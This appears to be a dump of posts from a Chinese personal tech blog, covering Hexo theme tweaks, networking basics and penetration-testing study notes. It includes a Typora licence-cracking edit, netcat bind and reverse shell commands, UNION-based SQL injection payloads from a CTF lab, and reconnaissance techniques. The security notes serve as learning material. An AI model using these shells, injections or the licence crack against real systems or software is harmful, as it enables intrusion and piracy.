src=&quot;https://unpkg.com/meting@2/dist/Meting.min.js&quot;&gt;&lt;/script&gt;&lt;!--Meting的依赖--&gt; &lt;meting-js server=&quot;netease&quot; type=&quot;playlist&quot; autoplay=false lrc-type=3 fixed=true id=&quot;4926587734&quot; theme=&quot;#ad7a86&quot;&gt; &lt;/meting-js&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery.pjax/1.9.6/jquery.pjax.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; ap = null Object.defineProperty(document.querySelector(&#x27;meting-js&#x27;),&quot;aplayer&quot;,&#123; set: function(aplayer) &#123; ap=aplayer ready(); &#125; &#125;); isRecover = false; function ready()&#123; ap.on(&#x27;canplay&#x27;, function () &#123; if(!isRecover)&#123; if(localStorage.getItem(&quot;musicIndex&quot;) != null)&#123; musicIndex = localStorage.getItem(&quot;musicIndex&quot;); musicTime = localStorage.getItem(&quot;musicTime&quot;); if(ap.list.index != musicIndex)&#123; ap.list.switch(musicIndex); &#125;else&#123; ap.seek(musicTime); ap.play(); localStorage.clear(); isRecover = true; &#125; &#125;else&#123; isRecover = true; &#125; &#125; &#125;); &#125; window.onbeforeunload = function(event) &#123; if(!ap.audio.paused)&#123; musicIndex = ap.list.index; musicTime = ap.audio.currentTime; localStorage.setItem(&quot;musicIndex&quot;,musicIndex); localStorage.setItem(&quot;musicTime&quot;,musicTime); &#125; &#125;;&lt;/script&gt; 修改上面id 也可以在&#x2F;blog&#x2F;themes&#x2F;stellar&#x2F;source&#x2F;css&#x2F;main.styl引用APlayer.min.css文件 1@import &#x27;APlayer.min.css&#x27;","tags":["stellar","music","blog"],"categories":["hexo"]},{"title":"Typora破解","path":"/posts/63b1c12d/","content":"Typora 破解Mac Typora 官网：https://typora.io/ Typora 中国官网：https://typoraio.cn/ 先打开 Typora 应用程序右击 Typora， 点击 显示包内容 依次进入： Resources&#x2F;TypeMark&#x2F;page-dist&#x2F;static&#x2F;js&#x2F; vim Licenselndex.180dd4c7.54395836.chunk.js hasActivated&#x3D;”true”&#x3D;&#x3D;e.hasActivated 替换为 hasActivated&#x3D;”true”&#x3D;&#x3D;”true” 关闭 Typora 重启即可 Windows 查看大佬博客https://github.com/743859910/Typora_Unlocker","tags":["软件"],"categories":["软件破解"]},{"title":"Mac彻底清除pycharm","path":"/posts/e8d2c75a/","content":"在mac上卸载重装pycharm后，点击pycharm无法打开。小编是直接将pycharm放入废纸篓进行卸载的，这样并未完全卸载pycharm，会有一些残留文件。原有pycharm未卸载干净，导致新装pycharm无法打开。 清除pycharm残留文件 打开终端，通过终端指令清除残留文件，需在以下四处清除残留文件 1、Preferences文件123cd ~/Library/Preferences/ #进入目录1s # 查看文件列表，查找pycharm版本（已知pycharm版本，可忽略该步）rm -rf PyCharm2019.2/ #清除pycharm残留文件 2、Logs文件下清除12cd ~/Library/Logs #进入目录rm -rf PyCharm2019.2/ # 清除pycharm残留文件 3、Application文件下清除12cd ~/Library/Application\\Support/ #进入入目录rm -rf PyCharm2019.2/ # 清除pycharm残留文件 4、Caches文件下清除12cd ~/Library/Caches/ #进入目录rm -rf PyCharm2019.2/ #清除pycharm残留文件","tags":["pycharm"],"categories":["软件破解"]},{"title":"MAC地址学习","path":"/posts/69809daf/","content":"交换机主要用于在同一局域网（LAN）内连接多个设备（如计算机、打印机等）。它通过MAC地址表来识别和转发数据帧，使得数据只发送到目标设备，而不是网络中的所有设备，从而提高了网络效率和安全性。 MAC地址学习1. 假设交换机A和B的MAC地址表是空的，主机11向主机33发送数据帧。 2. 交换机A接收到数据帧后，执行以下操作。（1） 交换机A学习主机11的MAC地址和端口号，此时交换机A的MAC地址表如下图所示。 （2） 交换机A查看自己的MAC地址表。 （3） 如果MAC地址表中有目的主机MAC地址则直接进行数据转发，如果没有则继续执行步骤4。（4） 交换机A向除源数据发送端口外的其他所有端口发送广播（这里交换机A从端口2和端口3向外发送广播）。 3. 交换机B在接收到数据帧后，执行以下操作。（1） 交换机B学习源MAC地址和端口号，此时交换机B的MAC地址表如下图所示。 （2） 交换机B查看自己的MAC地址表。 （3） 交换机B向除源数据发送端口外的其他所有端口发送广播（这里交换机B从端口1和端口2向外发送广播）。 4. 主机22查看接收到的数据帧，发现目标MAC地址不是自己，丢弃数据帧。5. 主机33接收数据帧，主机44丢弃数据帧。6. 假设这时候主机44要给主机11发送数据帧。7. 交换机B接收到数据帧后，执行以下操作。（1） 交换机B学习主机44的MAC地址和端口号，此时交换机B的MAC地址表如下图所示。 （2） 交换机B查看自己的MAC地址表，根据MAC地址表中的条目，单播转发数据到端口3。 8. 交换机A在接收到数据帧后，执行以下操作。（1） 交换机A学习源MAC地址和端口号，此时交换机A的MAC地址表，如下图所示。 （2） 交换机A查看自己的MAC地址表，根据MAC地址表中的条目，单播转发数据到端口1。 （3） 主机11接收到数据帧。至此，MAC地址学习过程结束。","tags":["网工"],"categories":["网络工程"]},{"title":"博客个性化页脚","path":"/posts/699ee88d/","content":"页脚设置，运行时正确显示显示您网站的运行时间，并每秒更新一次。消息根据一天中的不同小时而变化。个性化页脚可以通过添加自定义信息、社交媒体链接和动态内容（如网站运行时间和访客统计）来增强用户体验。利用图标（如FontAwesome）和样式（如CSS）美化页脚，使其既美观又实用。此外，可加入版权声明和联系方式，以建立品牌形象和用户信任。 修改footer.ejs themes&#x2F;stellar&#x2F;layout&#x2F;_partial&#x2F;main&#x2F;footer.ejs中末尾添加以下代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;%const content = theme.footer.content?.replace(&#x27;&#123;author.name&#125;&#x27;, (config.author || &#x27;Anonymity&#x27;))?.replace(&#x27;&#123;theme.name&#125;&#x27;, stellar_info(&#x27;name&#x27;))?.replace(&#x27;&#123;theme.version&#125;&#x27;, stellar_info(&#x27;version&#x27;))?.replace(&#x27;&#123;theme.tree&#125;&#x27;, stellar_info(&#x27;tree&#x27;))function layoutDiv() &#123; var el = &#x27;&#x27; el += `&lt;footer class=&quot;page-footer$&#123;scrollreveal(&#x27; &#x27;)&#125; footnote&quot;&gt;` el += &#x27;&lt;hr&gt;&#x27; // sitemap if (theme.footer.sitemap &amp;&amp; Object.keys(theme.footer.sitemap).length &gt; 0) &#123; el += &#x27;&lt;div class=&quot;sitemap&quot;&gt;&#x27; for (let group of Object.keys(theme.footer.sitemap)) &#123; let items = theme.footer.sitemap[group] if (items == undefined || items.length == 0) &#123; continue &#125; el += &#x27;&lt;div class=&quot;sitemap-group&quot;&gt;&#x27; el += &#x27;&lt;span class=&quot;fs15&quot;&gt;&#x27; + group + &#x27;&lt;/span&gt;&#x27; items.forEach((item, i) =&gt; &#123; el += &#x27;&lt;a href=&quot;&#x27; + url_for(md_link(item)) + &#x27;&quot;&gt;&#x27; el += __(md_text(item)) el += &#x27;&lt;/a&gt;&#x27; &#125;); el += &#x27;&lt;/div&gt;&#x27; &#125; el += &#x27;&lt;/div&gt;&#x27; &#125; // footer content el += &#x27;&lt;div class=&quot;footer-content&quot;&gt;&#x27; if (content) &#123; el += markdown(content) &#125; el += &#x27;&lt;span id=&quot;runtime_span&quot;&gt;&lt;/span&gt;&#x27; el += &#x27;&lt;/div&gt;&lt;/footer&gt;&#x27; return el&#125;%&gt;&lt;%- layoutDiv() %&gt;&lt;script type=&quot;text/javascript&quot;&gt; function show_runtime() &#123; window.setTimeout(show_runtime, 1000); const startDate = new Date(&quot;2023/05/10 17:00:00&quot;); const currentDate = new Date(); const timeDifference = currentDate - startDate; const millisecondsInADay = 24 * 60 * 60 * 1000; const days = timeDifference / millisecondsInADay; const fullDays = Math.floor(days); const hours = (days - fullDays) * 24; const fullHours = Math.floor(hours); const minutes = (hours - fullHours) * 60; const fullMinutes = Math.floor(minutes); const seconds = Math.floor((minutes - fullMinutes) * 60); const timeString = `$&#123;fullDays&#125; 天 $&#123;fullHours.toString().padStart(2, &#x27;0&#x27;)&#125; 小时 $&#123;fullMinutes.toString().padStart(2, &#x27;0&#x27;)&#125; 分 $&#123;seconds.toString().padStart(2, &#x27;0&#x27;)&#125; 秒`; const currentHour = currentDate.getHours(); // 获取当前小时数 let message; if (currentHour &lt; 18 &amp;&amp; currentHour &gt;= 9) &#123; // 使用当前小时数进行条件判断 message = `&lt;img class=&#x27;boardsign&#x27; src=&#x27;https://img.shields.io/badge/mikey-red?style=social&amp;logo=BuyMeACoffee&#x27; title=&#x27;祝我马上财富自由呀~&#x27;&gt;&lt;br&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt; 本站居然运行了 $&#123;timeString&#125; &lt;i id=&quot;heartbeat&quot; class=&quot;fas fa-heartbeat&quot;&gt;&lt;/i&gt;&lt;br&gt; &lt;/div&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt; 本博客所有文章除特别声明外，均采用&lt;a href=&quot;https://creativecommons.org/licenses/by-nc-sa/4.0/&quot;&gt;[CC BY-NC-SA 4.0]&lt;/a&gt; 许可协议，转载请注明出处。 &lt;/div&gt;`; &#125; else &#123; message = `&lt;img class=&#x27;boardsign&#x27; src=&#x27;https://img.shields.io/badge/sleep-red?style=social&amp;logo=BuyMeACoffee&#x27; title=&#x27;下班了就该开开心心地玩耍~&#x27;&gt;&lt;br&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt; 本站居然运行了 $&#123;timeString&#125; &lt;i id=&quot;heartbeat&quot; class=&quot;fas fa-heartbeat&quot;&gt;&lt;/i&gt;&lt;br&gt; &lt;/div&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt; 本博客所有文章除特别声明外，均采用&lt;a href=&quot;https://creativecommons.org/licenses/by-nc-sa/4.0/&quot;&gt;[CC BY-NC-SA 4.0]&lt;/a&gt; 许可协议，转载请注明出处。 &lt;/div&gt; &lt;br&gt;`; &#125; document.getElementById(&quot;runtime_span&quot;).innerHTML = message; &#125; show_runtime();&lt;/script&gt; 插入心跳图标 首先，确保您的博客中包含 Font Awesome。您可以将 Font Awesome CDN 链接添加到主题的布局文件中 在themes&#x2F;stellar&#x2F;layout&#x2F;_partial&#x2F;head.ejs中末尾添加以下代码 1&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css&quot;&gt; 修改icons.yml 在themes&#x2F;stellar&#x2F;_data&#x2F;icons.yml中末尾添加以下代码 123heartbeat: id: &quot;heartbeat&quot; class: &quot;fas fa-heartbeat&quot; 修改_custom.styl 在themes&#x2F;stellar&#x2F;source&#x2F;css&#x2F;_custom.styl中末尾添加以下代码 footer为页脚居中设置，heartbeat为跳动的心 1234567891011121314151617181920212223.page-footer &#123; text-align: center; /* Center all text inside the footer */&#125;.footer-content &#123; display: flex; flex-direction: column; align-items: center;&#125;#heartbeat &#123; color: red; animation: heartbeat 1s infinite;&#125;@keyframes heartbeat &#123; 0%, 25%, 50%, 75%, 100% &#123; transform: scale(1); &#125; 20%, 45%, 55%, 70% &#123; transform: scale(1.3); &#125;&#125; _config.stellar.yml配置(themes&#x2F;stellar&#x2F;_config.yml文件)1234footer: content: |# 本站由 [&#123;author.name&#125;](/) 使用 [&#123;theme.name&#125; &#123;theme.version&#125;](&#123;theme.tree&#125;) 主题创建。# 本博客所有文章除特别声明外，均采用 [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) 许可协议，转载请注明出处。","tags":["stellar"],"categories":["hexo"]},{"title":"eNSP路由器启动时一直显示#号","path":"/posts/ad452784/","content":"解决方案 参考1 参考2 已将所输入的此网络适配器的IP地址192.168.56.1分配治此计算机上的另一个适配器VirtualBox Host Only NetWork#2: 如果将相同的地址分配给两个适配器，且两个适配器都处于活动状态，则仅有其中一个适配器将使用此地址。这可能会导致系统配置错误。 以上都没有用，VMware可能占用192.168.56.1，改一下虚拟机网络配置","tags":["网络工程"],"categories":["网络工程"]},{"title":"14天","path":"/posts/ef627937/","content":"JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目;在前端开发和安全测试中，查找和分析JavaScript代码中的关键字和敏感信息是一项重要的任务。以下是一些用于递归爬取域名、分析页面中的JavaScript文件以及提取相关信息的工具和资源。 前端js代码搜索关键词src=path=method:&quot;get&quot;http.get(&quot;method:&quot;post&quot;http.post(&quot;$.ajaxhttp://service.httpposthttp://service.httpget JSINFO-SCAN https://github.com/p1g3/JSINFO-SCAN 递归爬取域名(netloc&#x2F;domain)，以及递归从JS中获取信息的工具。 JSFinder https://github.com/Threezh1/JSFinder 这里面比较差的 JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具 python JSFinder.py -u https://passer-by.com/pacman/ -d URLFinder https://github.com/pingc0y/URLFinder URLFinder是一款快速、全面、易用的页面信息提取工具,用于分析页面中的js与url,查找隐藏在其中的敏感信息或未授权api接口 URLFinder.exe -u https://passer-by.com/pacman/ -s 200 -m 2 FindSomething https://github.com/momosecurity/FindSomething 该工具是用于快速查在网页的html源码或js文件中提取URL，子域名的插件,该工具是用于快速在网页的html源码或js代码中提取一些有趣的信息的浏览器插件，包括请求的资源、接口的url，请求的ip和域名，泄漏的证件号、手机号、邮箱等信息。 FFUF https://github.com/ffuf/ffuf 模糊化工具，支持多种模糊化方式，支持多线程，支持自定义模糊化方式，支持自定义输出格式，支持 ffuf.exe -w httparchive_js_2023_10_28.txt -u https://passer-by.com/pacman/FUZZ -mc 200 ffuf.exe -w httparchive_js_2023_10_28.txt -u https://passer-by.com/pacman/FUZZ -t 200 wordlists https://wordlists.assetnote.io/ 项目地址https://github.com/assetnote/wordlists 功能强大的模糊化工具，用它来FUZZ模糊化js文件 Packer Fuzzer https://github.com/rtcatc/Packer-Fuzzer 一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具","tags":["web"],"categories":["信息收集"]},{"title":"信息打点","path":"/posts/9099c97b/","content":"信息收集是渗透测试的前期核心任务，是整个过程中的关键环节。只有收集到足够详尽的信息，才能为后续的测试提供有力支持。信息收集的主要内容包括网站的域名及子域名信息、目标网站的详细信息、网站的真实IP地址、敏感文件和目录、开放端口和中间件的信息等。通过各种渠道和方法尽可能多地获取该站点的相关信息，有助于我们发现更多的潜在渗透点和攻击突破口。 信息收集参考https://www.freebuf.com/articles/web/340195.html参考https://websec.readthedocs.io/zh/latest/info/port.html 工具网站棱角社区 (https://forum.ywhack.com/bountytips.php?tools) WEB域名备案信息 通过查询备案信息了解到该网站的所有者、联系人、电话号码、邮箱等敏感信息，从而尝试使用社会工程学或其他攻击手段 备案信息查询(http://www.beianx.cn/) 备案管理系统(https://beian.miit.gov.cn/) 企业产权 查找该网站所属企业的注册信息，了解企业的名称、地址、联系电话、注册资本等信息。小蓝本，免费，但是有些信息不全，或查不到，各网站结合使用，各自信息来源可能不同，包含内容可能不同。 天眼查(https://www.tianyancha.com/) 小蓝本(https://www.xiaolanben.com/) 爱企查(https://aiqicha.baidu.com/) 企查查(https://www.qcc.com/) 国外企查(https://opencorporates.com/) 注册域名 查询域名注册商的信息，以了解域名的注册者、联系方式、DNS服务器等敏感信息 域名注册查询(https://buy.cloud.tencent.com/domain) 反查解析 使用反查解析工具，查询该网站所使用的所有IP地址，以了解该网站的网络拓扑结构和架构 IP反查域名 爱站网(https://site.ip138.com/) 情报社区(https://x.threatbook.cn/) DNS数据 有将域名解析到某个IP的历史，就会留下记录，DNS数据即通过查询历史记录查到解析记录，对于查CDN有帮助，可能会查到没有CDN服务时的IP 超级ping(https://www.17ce.com/) 超级ping(https://ping.chinaz.com/) 接口查询 (https://get-site-ip.com/) IP社区库 (https://www.cz88.net/geo-public) 证书查询（HTTPS） HTTPS有证书，通过目标的证书，匹配其他哪些网站用过该证书 缺点：只针对HTTPS的网站，但是绝大部分重要的有价值的网站都会使用HTTPS CertificateSearch (https://crt.sh/) 网络空间 查询获取目标的信息 fofa (https://fofa.info/) 全球鹰 (http://hunter.qianxin.com/) 360夸克 (https://quake.360.cn/quake/#/index) 钟馗之眼 (https://www.zoomeye.org/?R1nG) 威胁情报 微步 (https://x.threatbook.cn/) 奇安信 (https://ti.qianxin.com/) 360 (https://ti.360.cn/#/homepage) 绿盟科技 (https://ti.nsfocus.com) 枚举解析 暴力破解，用字典跑。网站接口。 在线子域名查询 (http://tools.bugscaner.com/subdomain/) DNSGrep子域名查询 (https://www.dnsgrep.cn/subdomain) 子域名查询(https://dnsdumpster.com/) Layer OneForAll（子域名收集工具） 安全测试用的最多的子域名收集工具，实现以上情况的总结（网络空间、威胁情报除外） 工具强大的子域名收集器 (https://github.com/shmilylty/OneForAll)12python3 oneforall.py --target example.com runpython3 oneforall.py --targets ./example.txt run Web架构资产 程序语言 asp,php,aspx,jsp,py等 搭建平台 搭建平台是程序员开发网站时使用的工具，搭建平台分为开源和闭源。 获取程序源码用于代码审计（白盒测试），即从代码中挖掘漏洞。 有无源码影响测试类型： 无源码-黑盒测试 有源码-白盒测试（代码审计）、黑盒测试都可做 前端-框架源码 jQuery &#x2F; BootStrap &#x2F; Vue &#x2F; React &#x2F; Angular等 中间件探针 Web服务器：Apache &#x2F; Nginx &#x2F; Microsoft IIS等 应用服务器：Tomcat &#x2F; Jboss &#x2F; Weblogic &#x2F; Node.js等 web服务器与应用服务器的区别 Web服务器主要用于处理静态内容和HTTP请求，而应用服务器则用于处理动态内容和更复杂的操作。两者通常都会结合使用，以便提供完整的Web应用程序服务。 Web服务器：提供静态内容，如HTML、CSS和JavaScript等，以及处理对这些内容的HTTP请求 应用服务器：提供动态内容，如数据库查询和Web应用程序逻辑等，通常与Web服务器协同工作,需要用到端口扫描 其他类型服务器 数据库服务器：MySQL、PostgreSQL、Oracle等 文件服务器：Samba、FTP服务器等 邮件服务器：Exchange、Sendmail、Postfix等 DNS服务器：BIND、PowerDNS等 聊天服务器：XMPP服务器等 游戏服务器：Minecraft服务器、Steam服务器等 VPN服务器：OpenVPN、IPsec等 视频流服务器：Wowza Streaming Engine、NGINX RTMP等 后端-开源-指纹识别-源码下载 指纹识别平台识别出CMS TideFinger潮汐(http://finger.tidesec.net/) 云悉指纹(https://www.yunsee.cn/) Wappalyzer(https://github.com/AliasIO/wappalyzer) cmsmap cmseek 后端-闭源–源码泄漏 参考(https://www.secpulse.com/archives/124398.html) 1：识别出大致信息却无下载资源 2：未识别出信息使用码云资源获取 3：其他行业开发使用对口资源站获取 gitee (https://gitee.com/) github (https://github.com/) 互站网-源码售卖(https://www.huzhan.com/) 操作系统 Ping返回的TTL字段值可以猜测操作系统类型 Linux TTL=64是Linux系统 Windows TTL=128是Windows系统 Unix TTL=255是Unix系统 敏感目录扫描 robots.txt 后台目录 mysql管理接口 phpinfo 状态码 200 正常访问、302 跳转、404 不存在、403 没权限、50x 服务器内部错误 御剑、wwwscan、dirbuster、webrobot 端口扫描 参考(https://www.se7ensec.cn/2018/11/28/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93) Nmap、Masscan、网络空间 Nmap：端口扫描，应用协议，防火墙识别 下载(https://nmap.org/download.html) 使用(https://blog.csdn.net/qq_53079406/article/details/125263917) Masscan：端口扫描，应用协议 (https://github.com/robertdavidgraham/masscan) (https://www.cnblogs.com/lzy575566/p/15513726.html) 旁注和C段 旁注攻击 利用同一主机上面不同网站的漏洞得到webshell，从而利用主机上的程序或者是服务所暴露的用户所在的物理路径进行入侵； 通俗来说就是，同一个服务器上存在多个站点，如A、B站点，你在对A进行测试的时候没有攻击的入手点，通过测试B网站进入服务器然后在攻击A网站最终实现目的； 方法或工具 IP反查、SQL跨库查询、目录越权、whois信息等 C段渗透 不同服务器上面存放不同网站，并且都处于同一个网段 x.x.x.1-255属于同一个C段，例如192.168.1.1 ,那么192.168.1.1-192.168.1.255 都属于同一个C段，有些学校或者大公司，他们会持有整个IP段，这个ip段中所有的ip都是那个公司的资产，拿下一台可能有有用的信息，可能在同一内网。 旁站是同ip网站，C段是公网IP同一网段下的网站。 C段不是内网，但是有可能同一个C端在同一个内网 CDN 出现多个IP即启用CDN服务 入站：ping 或 请求网站 是自己请求的 —&gt;cdn节点 出站： 对方服务器去请求你设置的资源—-&gt;真实IP CDN服务识别： 超级ping(https://ping.chinaz.com/) CDN绕过 (https://mp.weixin.qq.com/s/zxEH-HMqKukmq7qXfrdnQQ) (https://zhuanlan.zhihu.com/p/33440472) WAF 参考(https://blog.csdn.net/weixin_44420143/article/details/118602836) 简介：Web Application Firewall，即web应用防护系统 作用：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。 功能： 漏洞攻击防护，如SQL注入、XSS攻击等 虚拟补丁：就是给网站打补丁，防止一些0day攻击 提供实时防护：就跟PC里面装的360安全卫士一样 原理：对HTTP&#x2F;HTTPS的请求报文进行分析，如果检测到是攻击行为（如对SQL注入的检测，就会对报文中的SQL语句检测特定的注入字符排列），则会进行阻断，将报文丢弃，不会让请求通过，同时，还可能对攻击源的IP地址进行封杀） WAF分类： 云WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等 硬件WAF：绿盟、安恒、深信服、知道创宇等公司商业产品 软件WAF：宝塔，安全狗、D盾等 代码级WAF：自己写的waf规则，防止出现注入等，一般是在代码里面写死的","tags":["web"],"categories":["信息收集"]},{"title":"ChatGPT本地部署","path":"/posts/fc5b3490/","content":"潘多拉 (Pandora)项目服务以及服务器关停 Docker部署本地ChatGPT项目简介潘多拉 (Pandora)，一个让你呼吸顺畅的 ChatGPT。潘多拉实现了网页版 ChatGPT 的主要操作。后端优化，绕过 Cloudflare，速度喜人。 体验地址 大佬的官网网站关注最新消息这里 点击 https://chat1.zhile.io 最新拿 Access Token 的技术原理，我记录在这里了。 可以访问 这里 拿 Access Token 也可以官方登录，然后访问 这里 拿 Access Token Access Token 有效期 14 天，期间访问不需要梯子。这意味着你在手机上也可随意使用。 这个页面上还包含一个共享账号的链接，没有账号的可以点进去体验一下。 项目部署一、Docker环境 点击https://yeasy.gitbook.io/docker_practice&#x2F;install 安装完成后，运行 docker version 检查是否安装成功 二、Docker Compose 点击https://dockerdocs.cn/compose/install/ 安装完成后，运行 docker-compose version 检查是否安装成功 三、docker-compose.yml 创建docker-compose.yml文件1vim docker-compose.yml 添加如下内容1234567891011version: &#x27;3&#x27; # 这是一个Docker Compose文件的版本声明，它表明该文件符合Docker Compose文件格式版本3services: pandora: #服务名，自定义 container_name: pandora #容器名，自定义r estart: always #开启自启动其他选项看以下备注 image: pengzhile/pandora #镜像名一般都是使用的哪个镜像就写哪个镜像。 ports: - &#x27;8181:8181&#x27; # 冒号:左边的8899可以改成任意vps上未使用过的端口,冒号右边是本docker镜像里的端口 environment: - PANDORA_SERVER=0.0.0.0:8899 #以http服务方式启动，格式：ip:port。 - PANDORA_ACCESS_TOKEN= #填入ACCESS_TOKEN 四、运行 运行docker-compose up -d 运行docker ps查看是否运行成功 运行docker logs -f pandora查看运行日志 运行docker exec -it pandora /bin/bash进入容器 运行docker-compose down关闭容器 docker删除镜像 运行docker ps -a 得到 CONTAINER ID 运行docker stop CONTAINER ID 运行docker rm CONTAINER ID 运行docker images 得到 IMAGE ID 运行docker rmi IMAGE ID 五、打开网站 http://127.0.0.1:8181 在服务器上搭建则：http:&#x2F;&#x2F;服务器地址:8181 六、登陆 点击Continue with Access Token 输入PANDORA_ACCESS_TOKEN内容 七、获取ACCESS_TOKEN 点击https://github.com/wozulong/ChatGPTAuthHelper/releases/tag/v2.0.0下载 zip &#x2F; tar.gz 并解压缩 打开 Chrome ，地址栏输入： chrome:&#x2F;&#x2F;extensions 打开 扩展程序 设置页面。 右上角打开 开发者模式 。 点击左上角 加载已解压的扩展程序 按钮，选择刚下载解压的插件文件夹内的 src 目录，确定安装。 你可以在 扩展程序 中看到 ChatGPT Auth Helper 说明安装成功。 现在你的 Chrome 可以用来使用 https://ai.fakeopen.com/auth 服务了。 登陆后复制ACCESS_TOKEN 也可以点击 https://chat1.zhile.io体验","tags":["搭建"]},{"title":"shell","path":"/posts/4592b2fd/","content":"反弹Shell是一种在渗透测试和攻击过程中常用的技术，通过这种技术，攻击者可以在受害者机器上执行命令并获取一个远程控制的Shell。具体实现方式是受害者机器主动发起一个连接到攻击者的机器上，通常是通过网络连接（比如TCP），然后攻击者通过这个连接向受害者机器发送命令，从而实现对受害者系统的控制。这种方法绕过了防火墙和其他安全机制的限制，因为它是受害者机器主动发起的连接。 ShellShell是一个命令行解释器，它为用户提供了一个向Linux内核发送请求以便运行程序的界面系统 反弹ShellReverse Shell，就是控制端首先监听某个 TCP&#x2F;UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了。点击，访问大佬博客 正向连接本地监听端口Linux控制Windows，Windows绑定SH到本地1234监听端口，Linux主动连接目标1234 12Windows: nc -e cmd.exe -lvp 1234Linux: ncat x.x.x.x(对方服务器IP) 1234 反向连接远程监听端口Windows控制Linux，Linux绑定SH到对方服务器1234端口，Windows监听本地端口1234 12Linux: ncat x.x.x.x(对方服务器IP) -e /bin/shWindows: nc -lvnp 1234","tags":["web"],"categories":["web"]},{"title":"SQL注入漏洞测试(HTTP头注入)","path":"/posts/74d3b872/","content":"SQL注入HTTP头部注入是一种攻击技术，攻击者通过在HTTP请求头部（如User-Agent、Referer、Cookie等）中注入恶意的SQL代码，试图操纵目标服务器的数据库查询。由于服务器端可能在处理这些头部信息时直接将其插入到SQL查询中，如果没有适当的输入验证和参数化查询，这些恶意代码就可能被执行，从而导致数据泄露、数据篡改或其他安全问题。这种攻击方式利用了HTTP头部字段通常不被严格验证的弱点。 SQL注入漏洞测试(HTTP头注入)题目类型SQL注入 使用工具FireFox、burpsuite 解题方向HTTP头部（HOST注入） Host（主机头）HTTP协议的一个字段 在http1.0中没有Host字段，在http1.1中，增加这个字段，http协议是建立tcp连接，需要知道对方的IP和端口号，然后发送数据建立连接。所有Host头域指定请求资源的Internet主机和端口。host头主要是用来将请求分派到指定的web网站，它的IP来自于网络层和传输层，对于http协议来说，它是基于tcp/ip的一个封装 在http1.1中不能缺少Host字段，缺少host字段服务器会返回400 bad request ，http1.0虽然不能缺少Host字段，但是该字段可以为空。 既然host头来自于客户，由客户端提供，而且可以修改，那么它是不可信的。当Host头部被修改为无效Host头会发生什么情况？大多数web服务器配置为将无法识别的Host头传送给列表中的第一台虚拟主机或者返回错误信息。因此，这使得把携带有任意Host头的请求发送到第一台虚拟主机上是可能的。 例如下面，很多host都不做HTML编码，便直接输出到页面，当host 被改为恶意连接时，出发恶意请求，容易造成缓存污染和密码重置这两种攻击 123 &lt;link href=http://_SERVER[&quot;HTTP_HOST&quot;]&gt;&lt;/link&gt; //触发一个get请求 &lt;form method=”POST”&gt;&lt;/form&gt; //触发POST请求 题解I.启动靶场1order by 5# 报错，所以4字段 II. 查看字段位置1union select 1,2,3,4# III. 获取数据库名1union select 1,database(),3,4# database &#x3D; pentesterlab IV. 获取数据库中的表名1union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() comment&#x2F;flag&#x2F;goods&#x2F;user&#x2F; V. 获取的表名中的列名1union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;flag&#x27; id&#x2F;flag VI. 获取id与flag值1union select 1,id,flag,4 from flag VII. 验证","categories":["web"]},{"title":"Hexo","path":"/posts/b132932/","content":"关于themes-butterfly主题的解决方案 如何设置单图页面插入代码 在 &#x2F;blog&#x2F;source&#x2F; 下新建 css 文件夹,文件夹中建 xxx.css 1234567891011121314151617181920212223/* 页脚与头图透明 */#footer &#123; background: transparent !important;&#125;#page-header &#123; background: transparent !important;&#125;/* 白天模式遮罩透明 */#footer::before &#123; background: transparent !important;&#125;#page-header::before &#123; background: transparent !important;&#125;/* 夜间模式遮罩透明 */[data-theme=&quot;dark&quot;] #footer::before &#123; background: transparent !important;&#125;[data-theme=&quot;dark&quot;] #page-header::before &#123; background: transparent !important;&#125; 修改配置文件 在主题配置文件 &#x2F;blog&#x2F;_config.butterfly.yml 文件中 inject 配置下的 head加入以下代码，引入刚刚创建的 xxx.css文件 123inject: head: - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/xxx.css&quot; media=&quot;defer&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;&gt; 在主题配置文件 &#x2F;blog&#x2F;_config.butterfly.yml 文件中配置 index_img 和 footer_bg 以及 background 1234567891011# The banner image of home pageindex_img: # Website Background (設置網站背景)# can set it to color or image (可設置圖片 或者 顔色)# The formal of image: url(http://xxxxxx.com/xxx.jpg)background: url(https://gcore.jsdelivr.net/gh/mikeytki/CDN/13.jpg)# Footer Backgroundfooter_bg: false","tags":["hexo"],"categories":["butterfly"]},{"title":"Sqlmap","path":"/posts/922590b9/","content":"在当今互联网飞速发展的时代，网络安全显得尤为重要。随着Web应用的普及，SQL注入攻击（SQL Injection）成为了一种常见且危害巨大的攻击手段。SQL注入攻击不仅能够窥探数据库中的敏感信息，甚至还能篡改数据、破坏数据库结构，给企业和用户带来巨大的损失。 为了应对这种威胁，安全研究人员和开发者们开发了各种工具和技术来检测和防御SQL注入攻击。SQLMap就是其中一款广受欢迎和高度评价的自动化SQL注入与数据库接管工具。它不仅功能强大，易于使用，而且支持多种数据库类型和注入技术，使得它成为渗透测试人员和安全爱好者的必备工具之一。 